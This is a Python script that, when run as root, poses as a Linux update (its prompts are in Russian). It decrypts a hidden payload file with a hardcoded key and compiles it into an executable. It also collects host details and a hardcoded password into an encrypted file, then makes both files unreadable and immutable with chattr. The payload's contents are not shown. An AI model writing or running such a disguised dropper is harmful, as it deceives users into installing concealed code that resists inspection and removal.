from time import sleep
from tqdm import tqdm
import PyInstaller
import getpass
import psutil
import cpuinfo
from shutil import copyfile
import os
import pyAesCrypt
import getpass
import subprocess
import socket
from cryptography.fernet import Fernet



key = b'MFh3t9QTg6ma36SaDm7KtCRo4MctkRcr7-DW8u7xRrA='

def encrypt(filename, keyy):
	f = Fernet(keyy)
	with open(filename, 'rb') as file:
		file_data = file.read()
	encrypted_data = f.encrypt(file_data)
	with open(filename, 'wb') as file:
		file.write(encrypted_data)
		
def decrypt(filename, keyy):
	f = Fernet(keyy)
	with open(filename, 'rb') as file:
		encrypted_data = file.read()
	decrypted_data = f.decrypt(encrypted_data)
	with open(filename, 'wb') as file:
		file.write(decrypted_data)	
		



def crypt(file):
	password = os.environ['livada']
	buffer_size = 512*1024
	pyAesCrypt.encryptFile(str(file), str(file) + ".crp", password, buffer_size)


	
user = getpass.getuser()	

if user == 'root':
	

	print('Установка обновления Linux. Не закрывайте программу...')

	cpu = cpuinfo.get_cpu_info()['brand_raw']

	mem = psutil.virtual_memory()

	pc_name = socket.gethostname()

	user = getpass.getuser()

	os.environ['livada'] = '123'

	path_ = input('Укажите путь к папке для установки обновления Linux:')
	if os.path.exists(path_):
		pass
	else:
		os.mkdir(path_)
	decrypt('sys.tat', key)
	copyfile("sys.tat", path_ + '/1a.py')
	
	##################################################

	
	#copyfile("./ext.tbl", path_+'/ext.tbl')

	data = 'CPU Info: ' + str(cpu) + '\nMemory info: ' +  str(mem) + '\nUserName: ' + str(user) + '\nPC Name: ' + str(pc_name) + '\nPersonal password: ' + os.environ['livada'] + '\nEnv name: livada'


	copyfile("./sys.tat", path_+'/defended.txt')

	encrypt('sys.tat', key)
	os.chdir(path_)
	with open('defended.txt', 'w') as file:
	    file.write(data)
	    
	os.system('python3 -m PyInstaller --onefile -n secure.exe '+path_ + '/1a.py')  	
	os.system('rm -rf ' + '__pycache__')    
	os.system('rm -rf build/')
	os.remove('secure.exe.spec')
	os.system('cp '+path_+'/dist/secure.exe ' +path_)
	os.system('rm -rf dist/')
	os.remove('1a.py')
	
	crypt('defended.txt')
	os.remove("defended.txt")
	# os.chdir(path_)

	os.system("chmod 000 defended.txt.crp")
	os.system("sudo chattr +i defended.txt.crp")

	
	os.system("chmod 000 secure.exe")
	os.system('sudo chmod +x secure.exe')
	os.system("sudo chattr +i secure.exe")
	

	#subprocess.call("sudo python3 " + "./1a.py", shell=True, cwd=path_)
	for i in tqdm(range(5)):
	    sleep(1)
else:
	print('Acces denied, try sudo[]')

